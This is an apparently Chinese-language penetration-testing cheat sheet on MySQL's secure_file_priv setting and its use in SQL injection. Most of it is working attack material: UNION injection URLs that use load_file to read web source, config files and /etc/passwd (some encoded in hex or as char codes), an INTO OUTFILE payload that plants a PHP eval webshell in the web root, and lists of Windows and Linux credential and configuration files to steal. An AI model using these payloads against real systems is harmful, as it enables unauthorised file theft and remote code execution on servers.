MYSQL新特性secure_file_priv对读写文件的影响 此开关默认为NULL，即不允许导入导出。

secure_file_priv 为空是的时候,方可读写,由于这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。 可以通过命令查看这个属性

```sql
select @@secure_file_priv
```

secure_file_priv为null   表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
secure_file_priv没有设置时，则表示没有任何限制

写入文件的时候还需要看php.ini里面gpc是否开启,开启的情况下,特殊字符都会被转义 ' 变成  \\'

读写操作用到两个函数

load_file()读取文件函数

读取当前目录下的index.php文件

```http
http://target_sys.com/article.php?id=-1 union select 1,2,load_file('C:\\inetpub\\wwwroot\\target_sys.com\\index.php')

http://target_sys.com/article.php?id=-1 union select 1,2,load_file('C:/inetpub/wwwroot/target_sys.com/index.php')
```

读取配置文件

```http
http://target_sys.com/article.php?id=-1 union select 1,2,load_file(0x433a2f696e65747075622f777777726f6f742f7461726765745f7379732e636f6d2f646174612f636f6e6669672e696e632e706870)
```

load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录

replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))

上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.

写shell话到当前目录
前提条件：

- gpc 关闭	

- 目录可写

into outfile  文件导出 空格
into dumpfile 没有空格

```http
http://target_sys.com/article.php?id=-1 union select 1,'<?php phpinfo();eval($_POST[\'smoon\']);?>',3 into outfile 'C:\\inetpub\\wwwroot\\target_sys.com\\wzxmt.php'
```



**windwos常用目录文件**

c:/boot.ini //查看系统版本

c:/windows/php.ini //php配置信息

c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码

c:/winnt/php.ini

c:/winnt/my.ini

c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码

c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码

c:\Program Files\Serv-U\ServUDaemon.ini

c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置

c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码

c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此

c:\Program Files\RhinoSoft.com\ServUDaemon.exe

C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码

c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件

c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.

c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机

d:\APACHE\Apache2\conf\httpd.conf

C:\Program Files\mysql\my.ini

C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码



**LUNIX/UNIX常用目录文件:**

/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件

/usr/local/apache2/conf/httpd.conf

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/usr/local/app/php5/lib/php.ini //PHP相关设置

/etc/sysconfig/iptables //从中得到防火墙规则策略

/etc/httpd/conf/httpd.conf // apache配置文件

/etc/rsyncd.conf //同步程序配置文件

/etc/my.cnf //mysql的配置文件

/etc/redhat-release //系统版本

/etc/issue

/etc/issue.net

/usr/local/app/php5/lib/php.ini //PHP相关设置

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/sysconfig/iptables 查看防火墙策略
